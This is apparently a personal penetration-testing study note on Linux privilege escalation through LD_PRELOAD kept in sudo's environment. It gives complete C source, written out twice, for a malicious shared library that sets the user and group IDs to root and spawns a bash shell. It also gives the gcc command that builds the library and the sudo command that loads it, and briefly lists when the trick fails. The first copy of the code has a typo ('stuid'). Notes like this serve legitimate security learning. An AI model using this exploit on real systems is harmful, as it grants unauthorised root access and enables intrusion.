`LD_PRELOAD` is used to specify a shared library `.so` that is charged before all the other libraries when a program is executed.

The idea is to create a custom shared library that contains a malicious code (*for example `system()`*) and the he can use `LD_PRELOAD` to charge this library when a program with `sudo` privilege is executed.


<mark style="background: #FFF3A3A6;">We start from:</mark>
```bash
sudo -l
```
- ![[Pasted image 20250116154802.png]]
- we can see `LD_PRELOAD`


# Create a malicious library

We create a `.c` file:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD"); //to unset this variable (avoid anomalies)
	setgid(0); //set our group as root
	stuid(0); //set our user as root
	system("/bin/bash");
}
```

Now we need to compile this file:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
- `-fPIC` is used to make the code  independent from the position, it is used for shared libraries
- `-nostartfiles` means that we don't need a enter point in our code (like `main`) so the start files are not necessary



<mark style="background: #BBFABBA6;">At this point we can run any command or executable on which we have the `sudo` permission in this way:</mark>
```bash
sudo LD_PRELOAD=/FULL_PATH/shell.so COMMAND_OR_EXEC
```
- ![[Pasted image 20250116155738.png]]


## When we cannot do it?

1. When sudo ignores `LD_PRELOAD` (new updated system do that)
2. When the `LD_PRELOAD` is cleaned up form the program or the command is executed in a isolated env
3. When the system protects against it




# STEP
- [ ] In command prompt type: 
- `sudo -l`

- [ ] From the output, notice that the `LD_PRELOAD` environment variable is intact.

- [ ] Open a text editor and type:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
   setgid(0);
   setuid(0);
   system("/bin/bash");
}
```

  

- [ ] Save the file as x.c

- [ ] In command prompt type:
- `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`

- [ ] In command prompt type:
- `sudo LD_PRELOAD=/tmp/x.so cmd`
- `cmd` must be one of the commands we dound with `sudo -l`
